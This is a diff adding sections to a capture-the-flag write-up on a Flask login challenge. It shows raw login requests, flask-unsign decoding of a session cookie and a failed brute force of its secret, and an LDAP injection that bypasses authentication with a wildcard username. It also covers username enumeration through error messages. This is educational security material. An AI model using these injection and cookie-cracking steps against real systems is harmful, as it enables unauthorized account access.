@@ -38,10 +38,106 @@ Ok, better look at source code (`Ctrl + U`):
 
 Nice! Found some user password in the login page source code. Lets see.
 
+```bash
 
+POST /login HTTP/1.1
+Host: btfryxiw.playat.flagyard.com
+Content-Type: multipart/form-data; boundary=----geckoformboundary18c55b09bf115fede816ea0a548b788
+Content-Length: 294
 
+------geckoformboundary18c55b09bf115fede816ea0a548b788
+Content-Disposition: form-data; name="username"
 
+player1
+------geckoformboundary18c55b09bf115fede816ea0a548b788
+Content-Disposition: form-data; name="password"
 
+password123
+------geckoformboundary18c55b09bf115fede816ea0a548b788--
+
+```
+
+![Nothing interesting on the main page.](images/main.png)
+
+The main page is quite static so the vuln must be within the authentication.
+Lets look at cookies.
+
+App sets some cookie. 
+
+```http
+
+HTTP/1.1 200 OK
+Date: Sun, 12 Oct 2025 16:01:24 GMT
+Content-Type: application/json
+Content-Length: 71
+Connection: keep-alive
+Vary: Cookie
+Set-Cookie: session=.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOvQ1A.xA6NsmlSZBM2OCGtRC5G_A44H0E; HttpOnly; Path=/
+
+```
+
+That looks like some flask cookie to me! Lets decode it:
+
+```bash
+$ flask-unsign --decode --cookie '.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOvQ1A.xA6NsmlSZBM2OCGtRC5G_A44H0E'
+
+{'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}
+```
+
+Ok it definitely looks liek some LDAP syntax `uid=player1,ou=users,dc=padl,dc=local`. But lets do one more simple thing before tackling the login page again. I wanna tryu to bruteforce the cookie signature since it can be done by same program `flask-unsign`:
+
+```bash
+
+flask-unsign --unsign --cookie '.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOvQ1A.xA6NsmlSZBM2OCGtRC5G_A44H0E'
+[*] Session decodes to: {'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}
+[*] No wordlist selected, falling back to default wordlist..
+[*] Starting brute-forcer with 8 threads..
+[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
+[*] Attempted (38272): w.;>{1t hozzfrsly generated st
+[!] Failed to find secret key after 55982 attempts.ea
+
+```
+
+It used all of the built in words and believe me I tried rockyou.txt at the CTF. But nothing here so... We need to bet on LDAP injection.
+
+### Exploring LDAP injection
+
+If there is some LDAP injection then this if we send instead of `player1` username the one with some LDAP all-char-symbol `player1*` can it help us?
+
+```bash
+
+POST /login HTTP/1.1
+Host: btfryxiw.playat.flagyard.com
+Content-Type: multipart/form-data; boundary=----geckoformboundary18c55b09bf115fede816ea0a548b788
+Content-Length: 294
+
+------geckoformboundary18c55b09bf115fede816ea0a548b788
+Content-Disposition: form-data; name="username"
+
+player1*
+------geckoformboundary18c55b09bf115fede816ea0a548b788
+Content-Disposition: form-data; name="password"
+
+password123
+------geckoformboundary18c55b09bf115fede816ea0a548b788--
+
+```
+
+YES, we get correct login. I explain here why. The Backend must be doing some unsanitized look up of the sort:
+
+```bash
+
+# it was not PHP in CTF but I like it :)
+$login = (&(username = $_POST["username"])(password = $_POST["password"]))
+
+```
+So app gets creds via POST request and puts in that paranthesis statement. If the variable `$login` is TRUE then we can get in. How does the comparison work? 
+
+At the begining there is the `&` sign which is like AND operator. It compares two object that each yield TRUE OR FALSE: `(& (TRUE)(FALSE))`, in this case password is wrong so statement is FALSE.
+
+The idea is to control username and password inputs to fool it to be TRUE. Lets try the game by setting password to `*` this should always return TRUE. BUT no! Password was sanitized. So we can only control the username.
+
+And we can easily guess that `admin` is a valid username because when we trie admin:admin it said `Invalid password` and not `Username not found`.
 
 
 
@@ -49,12 +145,6 @@ Nice! Found some user password in the login page source code. Lets see.
 
 ## Exploitation
 
-
-
-
-
-flask-unsign --decode --cookie '.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOuVug.gXxEpGtw600ebtSNuQx-LSC63ZU'
-{'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}
 
 Вот теперь понятно что мы имеем дело с LDAP аутентификацией
 
